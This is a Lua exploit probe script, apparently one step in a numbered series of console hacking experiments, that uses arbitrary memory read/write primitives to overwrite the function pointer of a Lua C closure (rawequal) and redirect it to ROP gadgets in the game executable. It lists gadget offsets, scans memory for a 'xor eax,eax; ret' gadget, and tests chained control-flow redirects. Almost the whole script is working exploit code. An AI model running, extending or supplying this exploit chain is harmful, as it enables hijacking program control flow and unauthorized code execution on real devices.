-- CRASH_CLASS: MODERATE
-- PROBE 56d: Redirect CClosure to eboot gadgets
--
-- Context: 56c CONFIRMED controlled function redirect works on non-VM
-- functions (rawequal, rawget, select). All four redirects returned
-- the target function's output correctly.
--
-- Now: redirect to eboot RX gadgets instead of other C functions.
-- Known eboot gadgets (offsets from 41r/41s/41t/41v):
--   ret           = eboot+0x42
--   pop rax; ret  = eboot+0x992
--   pop rdi; ret  = eboot+0xC9DFE
--   pop rsi; ret  = eboot+0xD77D  (41r)
--   pop rdx; ret  = eboot+0x420E6D
--
-- When a CClosure dispatch goes to "ret", the C ABI return value (eax)
-- determines how many results Lua sees. Random eax = unpredictable but
-- non-hanging behavior. If eax=0, Lua sees no return (nil).
--
-- Strategy: use rawequal as our redirectable function.
-- [A] Redirect rawequal -> "ret" gadget: test bare gadget exec
-- [B] Redirect rawequal -> "pop rax; ret": pops from stack, may crash
-- [C] Find "xor eax, eax; ret" in eboot for clean 0-return
-- [D] Redirect rawequal -> make_syscall's known C handler (getpid test)

print("=== PROBE 56d: GADGET REDIRECT VIA CCLOSURE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo))
    end
    return nil
end

local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local eboot_base = get_eboot_base()

print("[INFO] Addresses:")
print("  rawequal:   " .. hexval(rawequal_addr))
print("  rawget:     " .. hexval(rawget_addr))
print("  eboot base: " .. hexval(eboot_base))

if not rawequal_addr or not eboot_base then
    print("ABORT: missing addresses")
    return
end

-- Read original +0x20 values
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)
print(string.format("  rawequal +0x20: lo=0x%08X hi=0x%08X", rawequal_20_lo or 0, rawequal_20_hi or 0))

-- Compute gadget absolute addresses
local eboot_lo = to_num(eboot_base)
local eboot_hi_val = 0
do
    local h, l = get_hi_lo(eboot_base)
    eboot_hi_val = h
    eboot_lo = l
end

-- Gadget offsets from eboot base
local gadget_ret_off     = 0x42
local gadget_pop_rax_off = 0x992
local gadget_pop_rdi_off = 0xC9DFE
local gadget_pop_rsi_off = 0xD77D
local gadget_pop_rdx_off = 0x420E6D

-- Compute absolute addresses (carry-safe)
local function eboot_gadget(offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi_val
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

local ret_lo, ret_hi = eboot_gadget(gadget_ret_off)
local pop_rax_lo, pop_rax_hi = eboot_gadget(gadget_pop_rax_off)
local pop_rdi_lo, pop_rdi_hi = eboot_gadget(gadget_pop_rdi_off)

print(string.format("  ret gadget:     0x%08X_%08X", ret_hi, ret_lo))
print(string.format("  pop rax gadget: 0x%08X_%08X", pop_rax_hi, pop_rax_lo))
print(string.format("  pop rdi gadget: 0x%08X_%08X", pop_rdi_hi, pop_rdi_lo))

-- Verify gadget bytes are readable (eboot .text is RX)
local ret_byte = safe_rd(uint64(string.format("0x%X%08X", ret_hi, ret_lo)))
local pop_rax_byte = safe_rd(uint64(string.format("0x%X%08X", pop_rax_hi, pop_rax_lo)))
print(string.format("  ret gadget bytes:     0x%08X", ret_byte or 0))
print(string.format("  pop rax gadget bytes: 0x%08X", pop_rax_byte or 0))

-- ============================================================
-- [A] Scan eboot for "xor eax, eax; ret" (31 C0 C3)
-- This is the safest gadget: returns 0 to Lua (= nil)
-- ============================================================
print("")
print("[A] Scanning eboot for xor eax,eax;ret (31 C0 C3)")

local xor_eax_ret_off = nil
-- Scan eboot .text in 4-byte aligned dword reads looking for 31C0C3
-- Pattern: byte 0x31, 0xC0, 0xC3 at any alignment
local scan_limit = 0x100000  -- scan first 1MB of eboot
local scan_step = 1  -- byte-level via dword reads

for off = 0, scan_limit - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw then
        -- Check all 4 byte positions for 31 C0 C3
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256
        -- 31 C0 C3 starting at byte 0
        if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
            xor_eax_ret_off = off
            break
        end
        -- starting at byte 1
        if b1 == 0x31 and b2 == 0xC0 and b3 == 0xC3 then
            xor_eax_ret_off = off + 1
            break
        end
    end
    -- Also check cross-dword boundary: last byte of this + first 2 of next
    if off < scan_limit - 8 and dw then
        local b3 = math.floor(dw / 16777216) % 256
        if b3 == 0x31 then
            local next_addr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + off + 4))
            local ndw = safe_rd(next_addr)
            if ndw then
                local nb0 = ndw % 256
                local nb1 = math.floor(ndw / 256) % 256
                if nb0 == 0xC0 and nb1 == 0xC3 then
                    xor_eax_ret_off = off + 3
                    break
                end
            end
        end
    end
    -- Check: last 2 bytes of this dword + first byte of next
    if off < scan_limit - 8 and dw then
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256
        if b2 == 0x31 and b3 == 0xC0 then
            local next_addr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + off + 4))
            local ndw = safe_rd(next_addr)
            if ndw then
                local nb0 = ndw % 256
                if nb0 == 0xC3 then
                    xor_eax_ret_off = off + 2
                    break
                end
            end
        end
    end
end

if xor_eax_ret_off then
    print(string.format("  FOUND xor eax,eax;ret at eboot+0x%X", xor_eax_ret_off))
    -- Verify bytes
    local gaddr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + xor_eax_ret_off))
    local vb = safe_rd(gaddr)
    print(string.format("  verify bytes: 0x%08X (expect 0x??C3C031 or similar)", vb or 0))
else
    print("  NOT FOUND in first 1MB")
end

collectgarbage("stop")

-- ============================================================
-- [B] Redirect rawequal -> "ret" gadget (eboot+0x42)
-- C3 = ret. Returns whatever is in eax. Lua interprets eax as
-- the number of return values pushed onto the Lua stack.
-- ============================================================
print("")
print("[B] Redirect rawequal -> ret gadget (eboot+0x42)")
print("  Baseline rawequal(1,1) = " .. tostring(rawequal(1,1)))
print("  MARKER_B_BEFORE_WRITE")
memory.write_dword(rawequal_addr + 0x20, ret_lo)
memory.write_dword(rawequal_addr + 0x24, ret_hi)
print("  MARKER_B_AFTER_WRITE")
local b_ok, b_r1, b_r2, b_r3 = pcall(rawequal, 1, 1)
print("  MARKER_B_AFTER_CALL")
print("  pcall ok=" .. tostring(b_ok))
print("  r1=" .. tostring(b_r1) .. " r2=" .. tostring(b_r2) .. " r3=" .. tostring(b_r3))
-- Restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  MARKER_B_RESTORED")
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [C] Redirect rawequal -> xor eax,eax;ret (if found)
-- Should cleanly return 0 results = nil from Lua
-- ============================================================
print("")
if xor_eax_ret_off then
    print("[C] Redirect rawequal -> xor eax,eax;ret (eboot+0x" .. string.format("%X", xor_eax_ret_off) .. ")")
    local xor_lo, xor_hi = eboot_gadget(xor_eax_ret_off)
    print("  MARKER_C_BEFORE_WRITE")
    memory.write_dword(rawequal_addr + 0x20, xor_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_hi)
    print("  MARKER_C_AFTER_WRITE")
    local c_ok, c_r1 = pcall(rawequal, 1, 1)
    print("  MARKER_C_AFTER_CALL")
    print("  pcall ok=" .. tostring(c_ok) .. " r1=" .. tostring(c_r1))
    print("  (expected: ok=true r1=nil since eax=0 means 0 return values)")
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  MARKER_C_RESTORED")
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("[C] SKIP: no xor eax,eax;ret found")
end

-- ============================================================
-- [D] Redirect rawequal -> pop rax; ret (eboot+0x992)
-- 58 C3: pops 8 bytes from the stack into rax, then returns.
-- The popped value becomes rax (Lua return count).
-- May crash if stack is misaligned or return count is huge.
-- ============================================================
print("")
print("[D] Redirect rawequal -> pop rax;ret (eboot+0x992)")
print("  MARKER_D_BEFORE_WRITE")
memory.write_dword(rawequal_addr + 0x20, pop_rax_lo)
memory.write_dword(rawequal_addr + 0x24, pop_rax_hi)
print("  MARKER_D_AFTER_WRITE")
local d_ok, d_r1, d_r2 = pcall(rawequal, 1, 1)
print("  MARKER_D_AFTER_CALL")
print("  pcall ok=" .. tostring(d_ok) .. " r1=" .. tostring(d_r1) .. " r2=" .. tostring(d_r2))
-- Restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  MARKER_D_RESTORED")
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [E] Read stack around the CClosure dispatch call
-- Before redirecting, dump the Lua stack state to understand
-- what the C function receives
-- ============================================================
print("")
print("[E] Stack analysis via tostring redirect")
-- Redirect rawequal to tostring, then call with various args
-- to understand argument passing
memory.write_dword(rawequal_addr + 0x20, safe_rd(rawget_addr + 0x20))
memory.write_dword(rawequal_addr + 0x24, safe_rd(rawget_addr + 0x24))
-- rawequal is now rawget. Try various arg patterns:
local t = {[1]="idx1", [2]="idx2", [3]="idx3", hello="world"}
local e1 = rawequal(t, 1)
local e2 = rawequal(t, 2)
local e3 = rawequal(t, "hello")
print("  rawget(t,1)='idx1': " .. tostring(e1))
print("  rawget(t,2)='idx2': " .. tostring(e2))
print("  rawget(t,'hello')='world': " .. tostring(e3))
-- Restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [F] Test: can we chain two redirects in sequence?
-- Redirect rawequal -> rawget, use it, then redirect -> type, use it
-- Proves we can do multi-step operations
-- ============================================================
print("")
print("[F] Sequential multi-redirect")
local rawget_20_lo = safe_rd(rawget_addr + 0x20)
local rawget_20_hi = safe_rd(rawget_addr + 0x24)
local type_addr = parse_func_addr(type)
local type_20_lo = safe_rd(type_addr + 0x20)
local type_20_hi = safe_rd(type_addr + 0x24)

-- Step 1: rawequal -> rawget
memory.write_dword(rawequal_addr + 0x20, rawget_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawget_20_hi)
local f1 = rawequal({x="step1"}, "x")
print("  step1 rawequal-as-rawget: " .. tostring(f1) .. " (expected: step1)")

-- Step 2: rawequal -> type (careful: type is used by VM, but we're only
-- writing to rawequal's +0x20, not type's +0x20, so this is safe)
memory.write_dword(rawequal_addr + 0x20, type_20_lo)
memory.write_dword(rawequal_addr + 0x24, type_20_hi)
local f2 = rawequal(42)
print("  step2 rawequal-as-type: " .. tostring(f2) .. " (expected: number)")
local f3 = rawequal("hello")
print("  step3 rawequal-as-type: " .. tostring(f3) .. " (expected: string)")

-- Step 3: restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  restored, rawequal(1,1) = " .. tostring(rawequal(1,1)))

collectgarbage("restart")

print("")
print("=== PROBE 56d COMPLETE ===")
